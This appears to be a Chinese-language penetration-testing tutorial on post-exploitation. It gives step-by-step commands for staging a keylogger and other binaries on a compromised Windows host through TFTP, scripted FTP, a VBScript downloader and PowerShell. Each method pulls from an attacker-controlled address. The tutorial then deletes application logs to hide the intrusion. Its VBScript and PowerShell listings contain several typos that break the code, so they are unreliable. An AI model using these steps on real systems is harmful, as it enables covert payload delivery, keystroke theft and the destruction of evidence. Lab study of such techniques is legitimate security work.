后渗透

拿下目标服务器的shell后，避免管理员为漏洞打上补丁，之后就再也不能控制目标系统；由此，拿下目标主机shell后需要进行后渗透。

  • 上传工具
  • 提权
    • 若是拿到普通用户权限需要进行提权
  • 擦除攻击痕迹
    • 防止溯源
  • 安装后门
    • 长期控制
    • Dump 密码
    • 内网渗透
  • 后渗透阶段
    • 最大的挑战—防病毒软件
    • 使用合法的远程控制软件

上传工具

若控制的系统是Linux系统，目标系统会默认安装netcat、curl、wget；拿下目标主机后使用默认安装的工具下载木马或者远程控制软件。

若控制的系统是Windows系统，缺少预装的下载工具。

（相对于windows，linux更加容易实现木马或者远程工具的下载与安装）

交互式与非交互式shell

非交互式shell

（需要在windows系统下安装ftp服务）

在已经进入到非交互型的shell中，接着进入下一个子命令后，进一步输入帐号密码时无法执行后面的操作

交互式shell

在交互式shell中，可以正常执行后面的操作

对于nc侦听到的非交互式shell中，无法正常执行后面的操作，因此需要上传能够获得完整的交互式shell的后门或者木马进而完全控制目标主机。

TFTP传输

XP、2003中已默认安装，Win7、2008以后的系统需要单独添加，但经常被边界防火墙过滤。主流为FTP，是因为基于UDP协议，明文传输，不支持身份验证（无需登录验证即可下载服务器文件）。

思路：

在kali主机中创建一个目录，把此目录指定为TFTP服务主目录，再拷贝一个后门或者木马程序拷贝到TFTP主目录，在windows端使用TFTP命令将后门或者木马程序下载下来。

kali主机配置tftp服务
1、在kali主机创建TFTP主目录：mkdir /tftp
2、修改目录权限：chown -R nobody /tftp/    # 将所有者改成nobody，主目录中所有文件的属组都必须是nobody，这样才能被下载
3、cp /usr/share/windows-binaries/whoami.exe /tftp   # 查看windows当前用户
4、cp /usr/share/windows-binaries/klogger.exe /tftp  # 拷贝键盘记录器
5、atftpd --daemon --port 69 /tftp   #启动服务，--daemon表示以后台的方式启动，指定端口69，主目录tftp
6、

确保tftp服务是由atftpd这个进程所启动的

windows端下载后门程序

进入tftp

使用tftp -i 192.168.216.176 get whoami.exe/klogger.exe下载到windows端

查看是否传输到windows端

使用tasklist查看进程是否运行

其中使用klogger.exe时，必须是在对应权限用户敲击键盘之后才会记录文件；现在获取到的权限是system，而此时klogger.exe文件是在system权限下执行的，所以其他用户敲击键盘是不会记录的

1.txt是在system权限下创建的，其中有一些字符，klogger并没有进行记录；之后在windows端使用administrator用户运行klogger，使klogger在administrator权限下运行，再随机敲击键盘会生成klooger.txt文件，其中记录了administrator用户的键盘记录信息。

FTP传输

kali安装FTP服务

apt-get install pure-ftpd     # 安装pure-ftpd（vsftpd也可以）

配置脚本（ftp1.sh）

#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd test -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/       #创建的ftp主目录
/etc/init.d/pure-ftpd restart

执行脚本

./ftp1.sh # 由于脚本中会添加用户，执行过程中需要为创建的用户输入密码

上传后门

ls /ftphome/
cp /usr/share/windows-binaries/whoami.exe /ftphome/
cp /usr/share/windows-binaries/klogger.exe /ftphome/

由于目前获得的shell是非交互模式的，ftp传输时，在password命令处无法显示，所以当前直接利用ftp下载是行不通的；

思路：

将要执行的命令写到目标服务器的文本文件中，windows上执行ftp命令读取文本文件的命令进行下载。

上传文件

C:\>echo open 192.168.216.176 21>ftp.txt     
C:\>echo test>>ftp.txt
C:\>echo password>>ftp.txt　　　　# password是前面设置的密码
C:\>echo bin>>ftp.txt            # bin表示使用二进制的传输方式传输
C:\>echo GET whoami.exe >> ftp.txt
C:\>echo GET klogger.exe >> ftp.txt
C:\>echo bye >> ftp.txt

C:\>type ftp.txt        # type命令查看ftp.txt内容
type ftp.txt
open 192.168.216.176 21
test
password
bin
GET whoami.exe 
GET klogger.exe 
bye 

C:\>ftp -s:ftp.txt    # ftp -s表示让ftp调用文本文件中的命令去执行

C:\>whoami 
whoami
NT AUTHORITY\SYSTEM

步骤是和TFTP是一样的，唯一不同的就是tftp是交互型shell，ftp是非交互型shell

Vbscript传输

VBS是windows系统上默认的解释型脚本语言，在win7后增加了perl，通过web程序，http协议下载远程控制程序。

启动kali自带的Apache服务

/etc/init.d/apache2 start     
/etc/init.d/apache2 status

cd /var/www/html/
cp /usr/share/windows-binaries/klogger.exe /var/www/html
cp /usr/share/windows-binaries/whoami.exe /var/www/html

上传文件（wget.vbs）

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXSEITTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXSEITTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXSEITTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXSEITTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Noting Then Set http = CreateObjiect("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Noting Then Set http = CreateObjiect("WinHttp.MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Noting Then Set http = CreateObjiect("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Noting >> wget.vbs
echo Set fs = CreateObject("Scrippting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Miidb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

#以上命令分批次传输，不要一次性传输，可能会传输不完整

vbscript也是一种解释性脚本语言，需要使用windows自带的cscript命令调用vbscript脚本

使用以下命令下载后门文件

cscript wget.vbs http://192.168.216.176/whoami.exe whoami.exe

POWERSHELL传输

类似vbs的传输，依旧是通过web服务,http协议到目标服务器下载程序，注意需在win7,win8以后的系统运行。后缀必须命名成ps1。

$strongeDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = "http://192.168.216.176/whoami.exe"
$file = "new-exsploit.exe"  # 下载下来存到本地的文件名
$webclient DownloadFile($url,$file)

使用以下命令下载

powershell.exe -ExecutionPolicy Bypass  -NoLogo -Nonlnteractive -Noprofile -File wget.ps1

注意：在win7以后的系统里才会有powershell

擦除痕迹

以Slmail为例

打开C:\Program Files\SLmail\System文件夹，其中有应用程序日志，随便打开一个 应用程序日志，会发现有很多条日志发送了很多‘A’，对于管理员来说很容易发现主机是被入侵了

使用kali打开相应应用程序目录删除对应的日志文件即可
